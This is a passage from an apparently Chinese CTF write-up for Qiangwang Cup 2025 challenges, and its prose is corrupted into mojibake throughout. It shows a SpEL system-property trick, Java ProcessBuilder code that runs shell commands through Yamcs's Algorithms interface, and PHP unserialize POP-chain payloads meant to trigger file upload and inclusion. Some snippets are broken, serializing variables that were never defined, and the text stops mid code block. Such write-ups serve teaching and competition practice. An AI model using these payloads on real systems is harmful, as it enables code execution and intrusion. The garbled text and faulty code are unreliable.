SimpleEvaluationContext.forPropertyAccessors(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurePropertyAccessor</span>()).build();<br>        simpleContext.setVariable(<span class="hljs-string">&quot;systemProperties&quot;</span>, systemProperties);<br>        <span class="hljs-keyword">return</span> simpleContext;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°å®šä¹‰äº†ä¸€ä¸ªåä¸º<code>systemProperties</code>çš„ Beanï¼Œè¿”å›å½“å‰ JVM çš„ç³»ç»Ÿå±æ€§</p><p>å®šä¹‰äº†ä¸€ä¸ªåä¸º<code>restrictedEvalContext</code>çš„ Bean</p><p>åˆ›å»º<code>SimpleEvaluationContext</code>ï¼šè¿™æ˜¯ä¸€ä¸ªå—é™çš„ SpEL ä¸Šä¸‹æ–‡ï¼ˆç›¸æ¯”<code>StandardEvaluationContext</code>æ›´å®‰å…¨ï¼‰ï¼Œä»…æ”¯æŒåŸºæœ¬çš„è¡¨è¾¾å¼åŠŸèƒ½ï¼Œé™åˆ¶äº†å¯¹å¤æ‚å¯¹è±¡çš„è®¿é—®ï¼Œæ‰€ä»¥æ²¡åŠæ³•rceäº†</p><p>è€Œå°†<code>systemProperties</code>å¯¹è±¡ä½œä¸ºå˜é‡<code>systemProperties</code>æ”¾å…¥ä¸Šä¸‹æ–‡ï¼Œä½¿å¾— SpEL è¡¨è¾¾å¼ä¸­å¯ä»¥é€šè¿‡<code>#systemProperties</code>å¼•ç”¨ç³»ç»Ÿå±æ€§</p><p>æ‰€ä»¥å…ˆçœ‹ä¸€ä¸‹user.home</p><p><img src="/2025/10/21/å¼ºç½‘æ¯2025wp/image-20251019170116771.png" alt="image-20251019170116771"></p><p>æ›´æ”¹user.homeçš„å€¼ä¸º&#x2F;tmp</p><p><img src="/2025/10/21/å¼ºç½‘æ¯2025wp/image-20251019170231800.png" alt="image-20251019170231800"></p><p>æ‹¿åˆ°flag</p><h1 id="yamcs"><a href="/2025/10/21/å¼ºç½‘æ¯2025wp/#yamcs" class="headerlink" title="yamcs"></a>yamcs</h1><p>é™„ä»¶åªæœ‰ä¸€ä¸ªdockerï¼Œæ„Ÿè§‰åƒæ‰¾cveï¼Œæœä¸€ä¸‹yamcs</p><p>Yamcs æ˜¯ä¸€ä¸ªå¼€æºè½¯ä»¶æ¡†æ¶ ç”¨äºèˆªå¤©å™¨çš„æŒ‡æŒ¥å’Œæ§åˆ¶ï¼Œ å«æ˜Ÿã€æœ‰æ•ˆè½½è·ã€åœ°é¢ç«™ å’Œåœ°é¢è®¾å¤‡ã€‚</p><p><img src="/2025/10/21/å¼ºç½‘æ¯2025wp/image-20251019170653918.png" alt="image-20251019170653918"></p><p>æ‰‹å†Œé‡Œæåˆ°äº†éå¸¸å¤šçš„webæ¥å£</p><p>ç®€å•çœ‹äº†ä¸€ä¸‹ç¯å¢ƒä¸­çš„åŠŸèƒ½ç‚¹ï¼ŒAlgorithmsæ¥å£å¯ä»¥ç¼–å†™javaä»£ç ï¼Œä»–ä¼šæ‰§è¡Œä»£ç å¹¶è¾“å‡ºåˆ°out0</p><p><img src="/2025/10/21/å¼ºç½‘æ¯2025wp/image-20251019170756581.png" alt="image-20251019170756581"></p><p>å°è¯•é€šè¿‡æ‰§è¡Œå‘½ä»¤æ¥è·å–flag</p><p><img src="/2025/10/21/å¼ºç½‘æ¯2025wp/image-20251019171020573.png" alt="image-20251019171020573"></p><p>æŠ¥é”™äº†ï¼ŒåŸå› æ˜¯æ²¡æœ‰å¯¹åº”çš„åŒ…ï¼Œåªèƒ½ä½¿ç”¨ Java å†…ç½®çš„ ProcessBuilder äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// æ‰§è¡Œå‘½ä»¤ï¼šcat /flag</span><br>    java.lang.<span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">pb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    pb.redirectErrorStream(<span class="hljs-literal">true</span>); <span class="hljs-comment">// åˆå¹¶æ ‡å‡†é”™è¯¯åˆ°æ ‡å‡†è¾“å‡ºï¼Œé¿å…è¿›ç¨‹é˜»å¡</span><br>    java.lang.<span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> pb.start();<br><br>    <span class="hljs-comment">// è¯»å–å‘½ä»¤è¾“å‡º</span><br>    java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(p.getInputStream(), java.nio.charset.StandardCharsets.UTF_8)<br>    );<br>    java.lang.<span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.StringBuilder();<br>    String line;<br>    <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>        sb.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// ç­‰å¾…å‘½ä»¤æ‰§è¡Œå®Œæˆï¼Œè·å–é€€å‡ºç </span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">exitCode</span> <span class="hljs-operator">=</span> p.waitFor();<br>    sb.append(<span class="hljs-string">&quot;EXIT_CODE=&quot;</span>).append(exitCode);<br><br>    <span class="hljs-comment">// è¾“å‡ºç»“æœ</span><br>    out0.setStringValue(sb.toString());<br><br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    System.out.println(<span class="hljs-string">&quot;IOException: &quot;</span> + e.getMessage());<br>&#125; <span class="hljs-keyword">catch</span> (java.lang.InterruptedException e) &#123;<br>    System.out.println(<span class="hljs-string">&quot;Interrupted: &quot;</span> + e.getMessage());<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/10/21/å¼ºç½‘æ¯2025wp/image-20251019171335581.png" alt="image-20251019171335581"></p><p>æ²¡æŠ¥é”™äº†ï¼Œçœ‹ä¸‹è¾“å‡ºç»“æœ</p><p><img src="/2025/10/21/å¼ºç½‘æ¯2025wp/image-20251019171354952.png" alt="image-20251019171354952"></p><p>æ‹¿åˆ°flag</p><h1 id="ezphp-èµ›å"><a href="/2025/10/21/å¼ºç½‘æ¯2025wp/#ezphp-èµ›å" class="headerlink" title="ezphp(èµ›å)"></a>ezphp(èµ›å)</h1><p>è¿™é¢˜æ¯”èµ›çš„æ—¶å€™è¢«ç»•æ™•äº†ï¼Œæ²¡åšå‡ºæ¥ï¼Œèµ›åå‚è€ƒå‡ ä¸ªå¤§ä½¬çš„è§£æ³•å°è¯•å¤ç°äº†ä¸€ä¸‹ï¼Œæ€»çš„æ¥çœ‹è¿™é¢˜å°±ä¸‰æ­¥</p><p>ç¬¬ä¸€æ­¥ï¼šä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œè°ƒç”¨readflagè¿›è¡Œæ–‡ä»¶åŒ…å«</p><p>ç¬¬äºŒæ­¥ï¼šç»•è¿‡æ–‡ä»¶ä¸Šä¼ çš„å†…å®¹æ£€æµ‹</p><p>ç¬¬ä¸‰æ­¥ï¼šsuidææƒ</p><p>å°†æºç ç²¾ç®€ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$readflag</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;readflag = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;called upload\n&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-title function_ invoke__">phpinfo</span>();<br>            &#125;<br><br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;define readflag\n&quot;</span>);<br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>                    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;called readflag\n&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125;;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;called __destruct\n&quot;</span>);<br>        <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;f;<br>        <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;readflag;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;class&#x27;</span>) &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-variable">$func</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;func&#x27;</span>) &#123;<br>            <span class="hljs-variable">$func</span>();<span class="hljs-comment">//readflag();</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;else\n&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>testç±»çš„æ„é€ å‡½æ•°ä¸­newäº†ä¸€ä¸ªåŒ¿åç±»ï¼ŒåŒ¿åç±»çš„æ„é€ æ–¹æ³•æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼ŒåŒ¿åç±»è¿˜æœ‰ä¸€ä¸ªreadflagæ–¹æ³•ï¼Œä»–å®šä¹‰äº†ä¸€ä¸ªreadflagå‡½æ•°ï¼Œreadflagå‡½æ•°ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œå†…å®¹æ£€æµ‹ï¼Œç„¶åincludeåŒ…å«ã€‚</p><p>å…ˆæ¥åˆ†æç¬¬ä¸€æ­¥ï¼Œæ–‡ä»¶ä¸Šä¼ +è§¦å‘readflag</p><p>æƒ³è§¦å‘æ–‡ä»¶ä¸Šä¼ å¾ˆç®€å•ï¼Œåªè¦è§¦å‘testç±»çš„æ„é€ æ–¹æ³•å°±å¯ä»¥äº†ï¼Œè€Œè§¦å‘readflagå‡½æ•°éœ€è¦å…ˆè°ƒç”¨åŒ¿åç±»çš„readflagæ–¹æ³•ï¼Œç„¶åå†è°ƒç”¨readflagå‡½æ•°</p><p>æˆ‘ä»¬åªæœ‰ä¸¤ä¸ªåœ°æ–¹èƒ½è§¦å‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;class&#x27;</span>) &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-variable">$func</span>();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;func&#x27;</span>) &#123;<br>    <span class="hljs-variable">$func</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬æƒ³é€šè¿‡$func();çš„æ–¹å¼æ¥è°ƒç”¨ç±»é‡Œçš„å‡½æ•°ï¼Œéœ€è¦ç”¨åˆ°phpçš„æ•°ç»„</p><p>ä¹Ÿå°±æ˜¯ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªç±»Aï¼Œç±»Aæœ‰ä¸€ä¸ªreadflagæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼è°ƒç”¨è¿™ä¸ªreadflagæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$func</span> = [<span class="hljs-variable">$o</span>,<span class="hljs-string">&quot;readflag&quot;</span>];<br><span class="hljs-variable">$func</span>();<br></code></pre></td></tr></table></figure><p>å› ä¸ºè¿™é¢˜çš„åŒ¿åç±»æ˜¯ç»‘å®šåˆ°testç±»å¯¹è±¡çš„readflagå±æ€§ä¸Šçš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§åŒæ—¶åºåˆ—åŒ–å¤šä¸ªå¯¹è±¡æ¥å®ç°æ–‡ä»¶ä¸Šä¼ å’ŒåŒ…å«</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$o1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o1</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;f = <span class="hljs-string">&#x27;readflag&#x27;</span>;<br><br><span class="hljs-variable">$o2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o2</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o2</span>-&gt;f = [&amp;<span class="hljs-variable">$o1</span>-&gt;readflag,<span class="hljs-string">&#x27;readflag&#x27;</span>];<br><br><span class="hljs-variable">$o3</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o3</span>-&gt; key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt; f = [&amp;<span class="hljs-variable">$o1</span>,<span class="hljs-string">&#x27;__construct&#x27;</span>];<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>([<span class="hljs-variable">$o3</span>,<span class="hljs-variable">$o2</span>,<span class="hljs-variable">$o1</span>]);<br>     <span class="hljs-comment">//ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œo3è°ƒç”¨o1çš„æ„é€ æ–¹æ³•ï¼Œnewä¸€ä¸ªåŒ¿åç±»ï¼Œè§¦å‘æ–‡ä»¶ä¸Šä¼ ï¼Œo2è°ƒç”¨åŒ¿åç±»çš„readflagæ–¹æ³•å®šä¹‰äº†å…¨å±€çš„readflagå‡½æ•°ï¼Œo1è°ƒç”¨å…¨å±€çš„readflagå‡½æ•°ï¼Œè¿›è¡Œæ–‡ä»¶åŒ…å«</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·ä½ è¿è¡Œä¸€ä¸‹ä¼šå‘ç°æœ‰é—®é¢˜</p><p><img src="/2025/10/21/å¼ºç½‘æ¯2025wp/image-20251022102436027.png" alt="image-20251022102436027"></p><p>åŒ¿åç±»æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–çš„</p><p>è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œå¯ä»¥åœ¨åºåˆ—åŒ–çš„æ—¶å€™å…ˆæŠŠtestç±»çš„æ–¹æ³•åˆ æ‰ï¼Œå› ä¸ºæ–¹æ³•ä¸ä¼šè¢«åºåˆ—åŒ–ï¼Œæˆ–è€…å¯ä»¥å…ˆæŠŠæ¯ä¸ªå¯¹è±¡çš„readflagå±æ€§èµ‹å€¼ä¸º0ï¼Œåæ­£æˆ‘ä»¬ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨$o1çš„æ„é€ æ–¹æ³•ï¼Œreadflagä¼šè¢«é‡æ–°èµ‹å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$o1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o1</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;f = <span class="hljs-string">&#x27;readflag&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o2</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o2</span>-&gt;f = [&amp;<span class="hljs-variable">$o1</span>-&gt;readflag,<span class="hljs-string">&#x27;readflag&#x27;</span>];<br><span class="hljs-variable">$o2</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o3</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o3</span>-&gt; key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt; f = [&amp;<span class="hljs-variable">$o1</span>,<span class="hljs-string">&#x27;__construct&#x27;</span>];<br><span class="hljs-variable">$o3</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>([<span class="hljs-variable">$o3</span>,<span class="hljs-variable">$o2</span>,<span class="hljs-variable">$o1</span>]);<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šæ˜¯ç¬¬ä¸€ç§æ–¹æ³•ï¼Œä¸‹é¢ä»‹ç»çœ‹åˆ°çš„å¦ä¸€ç§çš„æ€è·¯</p><p>æ—¢ç„¶å¯ä»¥åˆ©ç”¨[ç±»åï¼Œæ–¹æ³•å]çš„æ–¹å¼è°ƒç”¨ç±»çš„æ–¹æ³•ï¼Œé‚£ä¹ˆåŒ¿åç±»æœ‰æ²¡æœ‰ç±»åå‘¢ï¼Œå¦‚æœæœ‰çš„è¯æ˜¯ä¸æ˜¯å°±å¯ä»¥ç›´æ¥è°ƒç”¨è€Œä¸ä¾èµ–readflagå±æ€§äº†</p><p>phpçš„get_declared_classes()å‡½æ•°å¯ä»¥è·å–åˆ°å½“å‰çš„æ‰€æœ‰ç±»å¯¹è±¡</p><p>æ‰“å°ä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°</p><pre><code class="hljs">[140] =&gt; mysqli_stmt[141] =&gt; PharException[142] =&gt; Phar[143] =&gt; PharData[144] =&gt; PharFileInfo[145] =&gt; class@anonymousE:\qwb2025\ez_php\test.php:9$0[146] =&gt; test</code></pre><p>class@anonymousE:\qwb2025\ez_php\test.php:9$0å°±æ˜¯åŒ¿åç±»çš„ç±»åï¼Œåˆ†æä¸€ä¸‹ä»–çš„ç»„æˆ</p><p>class@anonymousæ˜¯å›ºå®šçš„ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ï¼Œå¦‚æœä½ ç¼–ç ä¸€ä¸‹å†è¾“å‡ºå°±ä¼šå‘ç°å®ƒçš„æ ¼å¼</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">class</span>%<span class="hljs-number">40</span>anonymous%<span class="hljs-number">00</span>E%<span class="hljs-number">3</span>A%<span class="hljs-number">5</span>Cqwb2025%<span class="hljs-number">5</span>Cez_php%<span class="hljs-number">5</span>Ctest.php%<span class="hljs-number">3</span>A9%<span class="hljs-number">240</span><br></code></pre></td></tr></table></figure><p>class@anonymouså’Œè·¯å¾„ä¹‹é—´æœ‰ä¸€ä¸ª%00</p><p>æœ€åçš„9æ˜¯åˆ›å»ºå¯¹è±¡çš„ä»£ç çš„è¡Œå·ï¼Œ$0æ˜¯ä¸€ä¸ªè®¡æ•°å™¨</p><p><strong>æ³¨æ„</strong>ï¼šç»æµ‹è¯•ï¼Œå¦‚æœæ˜¯php7.3åé¢ä¸æ˜¯è¡Œå·åŠ ä¸Šè¿™ä¸ªè®¡æ•°å™¨ï¼Œè€Œæ˜¯ä¸€ä¸²16è¿›åˆ¶æ•°å­—</p><p>é‚£ä¹ˆæˆ‘ä»¬å°è¯•ä¸€ä¸‹åˆ©ç”¨è¿™ä¸ªç±»åæ¥è°ƒç”¨æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$o1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o1</span>-&gt;f = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;key = <span class="hljs-string">&#x27;class&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o2</span>-&gt;f = [<span class="hljs-string">&quot;class@anonymous\0E:\qwb2025\\ez_php\\test.php:9<span class="hljs-subst">$0</span>&quot;</span>, <span class="hljs-string">&#x27;readflag&#x27;</span>];<br><span class="hljs-variable">$o2</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o2</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o3</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o3</span>-&gt;f = <span class="hljs-string">&#x27;readflag&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>([<span class="hljs-variable">$obj1</span>, <span class="hljs-variable">$obj2</span>, <span class="hljs-variable">$obj3</span>]));<br></code></pre></td></tr></table></figure><p>è¿™æ ·ä¹Ÿæ˜¯å¯ä»¥çš„,ä½†æ˜¯æ³¨æ„è¦æ¢æˆé¢˜ç›®ç¯å¢ƒçš„åŒ¿åå‡½æ•°åï¼Œå› ä¸ºå®ƒçš„ä»£ç éƒ½åœ¨ç¬¬ä¸€è¡Œï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å¾—åˆ°ï¼ˆå¯ä»¥è‡ªå·±èµ·ä¸ªç¯å¢ƒåŠ ä¸ªè¾“å‡ºï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$o1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o1</span>-&gt;f = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;key = <span class="hljs-string">&#x27;class&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o2</span>-&gt;f = [<span class="hljs-string">&quot;class@anonymous\0/var/www/html/index.php(1) : eval()&#x27;d code:1<span class="hljs-subst">$0</span>&quot;</span>, <span class="hljs-string">&#x27;readflag&#x27;</span>];<br><span class="hljs-variable">$o2</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o2</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o3</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o3</span>-&gt;f = <span class="hljs-string">&#x27;readflag&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>([<span class="hljs-variable">$obj1</span>, <span class="hljs-variable">$obj2</span>, <span class="hljs-variable">$obj3</span>]));<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥å°±è§£å†³äº†ï¼Œä¸‹é¢åˆ†æå¦‚æœç»•è¿‡å†…å®¹æ£€æµ‹ï¼Œä¹Ÿæœ‰ä¸¤ç§æ€è·¯</p><p><strong>æ€è·¯ä¸€</strong>ï¼š</p><p>æ–‡ä»¶ä¸Šä¼ çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 